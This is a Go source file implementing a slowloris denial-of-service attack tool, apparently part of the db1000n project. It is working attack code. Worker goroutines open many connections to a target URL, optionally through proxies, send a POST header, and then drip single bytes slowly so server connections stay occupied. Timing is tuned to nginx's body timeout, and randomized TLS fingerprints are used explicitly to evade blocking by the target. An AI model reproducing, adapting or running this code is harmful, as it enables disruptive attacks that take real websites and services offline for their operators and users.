// Package slowloris [inspired by https://github.com/valyala/goloris]
package slowloris

import (
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"time"

	"github.com/google/uuid"
	utls "github.com/refraction-networking/utls"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
)

// Config holds all the configuration values for slowloris
type Config struct {
	ContentLength    int           // The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size
	DialWorkersCount int           // The number of workers simultaneously busy with opening new TCP connections
	RampUpInterval   time.Duration // Interval between new connections' acquisitions for a single dial worker (see DialWorkersCount)
	SleepInterval    time.Duration // Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout
	Duration         time.Duration // Duration
	Path             string        // Target Path. Http POST must be allowed for this Path
	HostHeader       string        // Host header value in case it is different than the hostname in Path
	ProxyURLs        string
	Timeout          time.Duration
}

const sharedReadBufSize = 4096

var (
	sharedReadBuf  = make([]byte, sharedReadBufSize)
	sharedWriteBuf = []byte("A")
)

// Start starts a slowloris job with specific configuration
func Start(stopChan <-chan struct{}, config *Config, a *metrics.Accumulator, logger *zap.Logger) error {
	targetURL, err := url.Parse(config.Path)
	if err != nil {
		return fmt.Errorf("error parsing path %q: %w", config.Path, err)
	}

	targetHostPort := targetURL.Host
	if !strings.Contains(targetHostPort, ":") {
		port := "80"
		if targetURL.Scheme == "https" {
			port = "443"
		}

		targetHostPort = net.JoinHostPort(targetHostPort, port)
	}

	host := targetURL.Host
	if len(config.HostHeader) > 0 {
		host = config.HostHeader
	}

	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
		targetURL.RequestURI(), host, config.ContentLength))

	for i := 0; i < config.DialWorkersCount; i++ {
		go dialWorker(stopChan, config, targetHostPort, targetURL, requestHeader, a.Clone(uuid.NewString()), logger)
		time.Sleep(config.RampUpInterval / time.Duration(config.DialWorkersCount))
	}

	time.Sleep(config.Duration)

	return nil
}

func dialWorker(stopChan <-chan struct{}, config *Config,
	targetHostPort string, targetURI *url.URL, requestHeader []byte, a *metrics.Accumulator, logger *zap.Logger,
) {
	for {
		select {
		case <-time.After(config.RampUpInterval):
			if conn := dialVictim(config, targetHostPort, targetURI.Scheme == "https", logger); conn != nil {
				go doLoris(config, targetURI.Scheme, targetHostPort, conn, requestHeader, a.Clone(uuid.NewString()), logger)
			}
		case <-stopChan:
			return
		}
	}
}

func dialVictim(config *Config, hostPort string, isTLS bool, logger *zap.Logger) io.ReadWriteCloser {
	conn, err := utils.GetProxyFunc(config.ProxyURLs, config.Timeout, false)("tcp", hostPort)
	if err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("couldn't establish connection", zap.String("addr", hostPort), zap.Error(err))

		return nil
	}

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		// This should never happen
		return nil
	}

	const bufferSize = 128

	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot shrink TCP read buffer", zap.Error(err))

		return nil
	}

	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot shrink TCP write buffer", zap.Error(err))

		return nil
	}

	if err = tcpConn.SetLinger(0); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot disable TCP lingering", zap.Error(err))

		return nil
	}

	if !isTLS {
		return tcpConn
	}

	// Use custom TLS connection to avoid being blocked on the target resource
	// by the SSL fingerprinting (https://ja3er.com/about.html)
	tlsConn := utls.UClient(tcpConn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)

	if err = tlsConn.Handshake(); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		conn.Close()
		logger.Debug("couldn't establish tls connection", zap.String("addr", hostPort), zap.Error(err))

		return nil
	}

	return tlsConn
}

func doLoris(config *Config, scheme, destinationHostPort string, conn io.ReadWriteCloser, requestHeader []byte,
	a *metrics.Accumulator, logger *zap.Logger,
) {
	defer conn.Close()

	target := scheme + "://" + destinationHostPort
	headerLen, err := conn.Write(requestHeader)

	a.AddStats(target, metrics.Stats{1, 0, 0, uint64(headerLen)})

	if err != nil {
		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot write requestHeader", zap.ByteString("header", requestHeader), zap.Error(err))

		return
	}

	readerStopCh := make(chan struct{})
	go nullReader(conn, readerStopCh, logger)

	var bytesSent int
	for ; bytesSent < config.ContentLength; bytesSent++ {
		select {
		case <-time.After(config.SleepInterval):
		case <-readerStopCh:
			a.Inc(target, metrics.ResponsesReceivedStat)

			break
		}

		if _, err := conn.Write(sharedWriteBuf); err != nil {
			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
			logger.Debug("cannot write bytes", zap.Int("current", bytesSent), zap.Int("total", config.ContentLength), zap.Error(err))

			break
		}

		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
	}

	a.AddStats(target, metrics.Stats{0, 1, 0, uint64(bytesSent)}).Flush()
}

func nullReader(conn io.Reader, ch chan<- struct{}, logger *zap.Logger) {
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		logger.Debug("error when reading server response", zap.Error(err))
	} else {
		logger.Debug("unexpected response read from server", zap.ByteString("buffer", sharedReadBuf[:n]))
	}

	close(ch)
}
